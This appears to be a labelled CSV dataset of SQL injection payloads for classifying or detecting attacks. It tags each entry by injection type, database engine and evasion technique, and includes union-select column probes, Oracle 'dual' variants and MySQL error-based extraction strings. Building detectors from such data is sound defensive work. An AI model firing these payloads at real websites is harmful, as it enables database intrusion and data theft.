payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"-3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-1722' union all select 1408,1408,1408#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as tsry where 6594 = 6594 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"1' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 'mttj' like 'mttj",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv2_csv,unknown
"-4770 ) ) ) union all select 6356,6356,6356,6356,6356#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1 ) where 1333 = 1333 order by 1--,union_based,unknown,,0.7,rule,sqliv2_csv,order_by
"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) order by 1--",union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-3699%' ) ) ) union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) union all select null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" where 7290 = 7290 union all select null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 ) as zdym where 1578 = 1578 union all select null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' ) ) union all select null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2899"" ) ) as uyoc where 8417 = 8417 union all select 8417,8417,8417,8417--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'tkmc' from dual where 9675 = 9675 union all select null,null,null,null--",union_based,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"-9577'|| ( select 'vloa' from dual where 7184 = 7184 union all select 7184,7184#",union_based,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
-6327' ) ) union all select 2685--,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) union all select null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-5970' where 2769 = 2769 union all select 2769--,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 where 4944 = 4944 union all select null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%' ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) union all select null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) where 1700 = 1700 union all select null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-8159 where 2793 = 2793 union all select 2793,2793,2793,2793,2793#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%' ) union all select null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7008' ) ) union all select 9080,9080,9080#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-9509' ) where 9303 = 9303 order by 1#,union_based,unknown,,0.7,rule,sqliv2_csv,order_by
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4121%"" ) union all select 2659,2659,2659,2659,2659,2659,2659,2659--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) union all select null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5957 ) ) ) union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1434' ) ) union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) ) union all select null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7887' ) union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8309'|| ( select 'qecl' where 8449 = 8449 union all select 8449,8449,8449,8449,8449,8449,8449--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-7111 union all select 2409,2409,2409,2409,2409,2409#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3035"" ) union all select 7912,7912,7912#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3321"" where 1603 = 1603 union all select 1603,1603,1603,1603#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' ) ) as xuab where 4369 = 4369 union all select null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-8073 ) ) ) union all select 4481,4481,4481,4481--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-6431"" ) ) union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3116"" ) ) ) union all select 4600,4600,4600,4600--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" union all select null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" where 1765 = 1765 union all select null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1'+ ( select vupb where 9575 = 9575 union all select null,null,null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' ) where 6988 = 6988 union all select null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-5039 union all select 2114#,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) # aetd",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"1 ) ) ) union all select null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' union all select null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9098' union all select 3476,3476,3476,3476,3476,3476#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7083 union all select 7705,7705,7705,7705,7705#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) ) union all select null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7007 ) union all select 6704,6704--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3378%"" ) ) union all select 9357,9357,9357,9357,9357--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-4882' order by 1#,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
-9005 union all select 4410#,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) where 3084 = 3084 union all select null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-4993"" union all select 6959,6959,6959--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-7901 ) order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) # vojr",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-5438"" ) union all select 3170,3170--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1368 ) ) union all select 1310,1310,1310,1310,1310#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1550' in boolean mode ) union all select 9777,9777,9777--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8797"" ) ) order by 1#",union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"1' where 2964 = 2964 union all select null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-1256' in boolean mode ) union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) order by 1#",union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-4015'|| ( select 'qeqv' from dual where 1437 = 1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",union_based,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"-7418 union all select 1340,1340,1340,1340,1340#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) as tgso where 1349 = 1349 union all select null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-1275"" union all select 7861,7861,7861,7861,7861#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) union all select null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-6770' ) ) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) union all select null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-6987' union all select 4721,4721--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5360' where 8178 = 8178 union all select 8178,8178,8178--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-4965 ) as imga where 3705 = 3705 union all select 3705--,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%' ) union all select null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2790' ) as xhct where 5756 = 5756 union all select 5756,5756#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-5496 union all select 2099,2099,2099#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8609' union all select 9384,9384,9384,9384--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9557 ) where 2891 = 2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1"" union all select null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) ) union all select null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' where 8969 = 8969 union all select null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-9947"" ) ) ) union all select 8765,8765,8765,8765,8765#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9937' ) ) union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4798"" ) ) ) union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) where 3250 = 3250 union all select null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' ) ) ) union all select null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4764 ) where 8200 = 8200 union all select 8200,8200,8200,8200--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-5389'|| ( select 'gggl' where 1020 = 1020 union all select 1020#,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%"" ) union all select null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" where 9172 = 9172 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"1%"" ) ) union all select null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-6473' union all select 7537#,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1'+ ( select 'yahq' where 6974 = 6974 union all select null--,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' ) where 8268 = 8268 union all select null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
1%' ) order by 1#,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) union all select null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) union all select null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' in boolean mode ) union all select null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5292' ) union all select 1439,1439,1439,1439#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' where 4358 = 4358 union all select null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%"" ) ) ) union all select null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7138"" union all select 2341,2341,2341,2341--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) where 5925 = 5925 union all select null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%"" ) ) order by 1--",union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"1"" ) where 3058 = 3058 union all select null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%"" ) ) union all select null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( ""%"" = """,union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-7016%"" ) ) union all select 8847,8847,8847--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8124 ) union all select 7251,7251,7251#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3930%"" ) ) order by 1#",union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"1 where 8948 = 8948 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,unknown,case_variation|hex_string,0.7,rule,sqliv2_csv,unknown
"-8491"" where 9043 = 9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-1844' ) union all select 9572,9572,9572,9572#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4811' ) ) ) union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1%' ) ) ) union all select null#,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' union all select null,null,null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-7277 ) ) ) order by 1#,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-5903%' ) union all select 8293,8293,8293,8293,8293,8293,8293,8293#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) union all select null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2803"" ) union all select 5337,5337,5337,5337,5337,5337,5337#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-6775"" union all select 7484,7484#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5420' ) union all select 2508,2508,2508,2508,2508,2508,2508#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' in boolean mode ) union all select null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-8760 ) where 8277 = 8277 union all select 8277--,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 ) ) ) union all select null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) ) union all select null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'neqi' where 6873 = 6873 union all select null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-1634%' union all select 5937,5937,5937,5937--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" union all select null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" union all select null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7637"" union all select 8498,8498,8498--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%"" ) ) ) union all select null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9256"" ) ) union all select 2977,2977,2977,2977,2977,2977,2977--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3758' ) ) union all select 9460,9460,9460,9460,9460,9460,9460,9460--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-2530%' order by 1#,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
1'+ ( select gguu where 7809 = 7809 union all select null--,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-6512'+ ( select 'zdjx' where 5454 = 5454 order by 1--,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,order_by
1' ) ) ) union all select null#,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3370' in boolean mode ) union all select 3432,3432,3432,3432#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3822"" ) ) as dftp where 2817 = 2817 union all select 2817,2817,2817,2817,2817,2817#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-9014%' ) union all select 4211,4211,4211,4211,4211,4211#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1 ) ) ) union all select null#,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-1123' ) ) ) union all select 6735,6735,6735,6735,6735,6735,6735,6735#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7815' union all select 2638,2638,2638,2638,2638--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7950 where 9619 = 9619 union all select 9619,9619,9619,9619--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-8923'+ ( select xgvz where 9858 = 9858 union all select 9858,9858,9858#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 where 8389 = 8389 union all select null,null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and 'idxa' = 'idxa",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
-9072 ) as saot where 2278 = 2278 order by 1#,union_based,unknown,,0.7,rule,sqliv2_csv,order_by
"1 ) where 3915 = 3915 union all select null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'jzwq' where 3289 = 3289 union all select null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
1' ) as zmvn where 2887 = 2887 union all select null--,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' ) ) ) union all select null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) union all select null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5617 ) where 2132 = 2132 union all select 2132,2132,2132,2132#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-1769 union all select 6054--,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-6815 ) where 2498 = 2498 union all select 2498,2498,2498,2498,2498--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' where 2373 = 2373 union all select null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-7126' ) ) as fzpp where 8078 = 8078 union all select 8078,8078,8078,8078,8078,8078,8078#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-9809' order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-9008' ) union all select 4976,4976,4976,4976#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) as hymr where 5497 = 5497 union all select null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-5779 ) union all select 6089,6089--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) union all select null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9178 where 2253 = 2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' ) as wtfo where 5666 = 5666 union all select null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%' ) union all select null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2340%"" order by 1#",union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-4093' ) ) union all select 5785,5785,5785#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3902' ) ) ) union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9684"" order by 1#",union_based,unknown,,0.8,rule,sqliv2_csv,order_by
-1579%' ) ) ) union all select 7272#,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8869"" where 3019 = 3019 union all select 3019,3019,3019#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-4876"" ) ) as saug where 2256 = 2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
1 ) ) as efjb where 4642 = 4642 order by 1#,union_based,unknown,,0.7,rule,sqliv2_csv,order_by
"-8677'|| ( select 'ihpm' from dual where 9571 = 9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",union_based,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"-2790%"" ) union all select 5070,5070#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3952' ) union all select 6644,6644,6644--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5845' ) ) ) union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-3304' ) ) order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"1 ) as jvuo where 6859 = 6859 union all select null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1' ) where 5276 = 5276 union all select null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1'|| ( select 'aair' where 9234 = 9234 union all select null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-4165"" where 1772 = 1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-8521' ) union all select 2446,2446,2446,2446,2446,2446,2446#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8109%"" ) ) union all select 9089,9089--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9007 ) as gill where 6462 = 6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-6731"" where 6166 = 6166 union all select 6166,6166,6166,6166,6166,6166--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-7984' order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-4695' ) ) ) union all select 5844,5844,5844,5844,5844,5844#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2382%' ) union all select 8885,8885,8885,8885,8885,8885,8885#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" union all select null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 'xzlx' like 'xzlx",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv2_csv,unknown
"1%' ) ) union all select null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-7940%"" ) union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
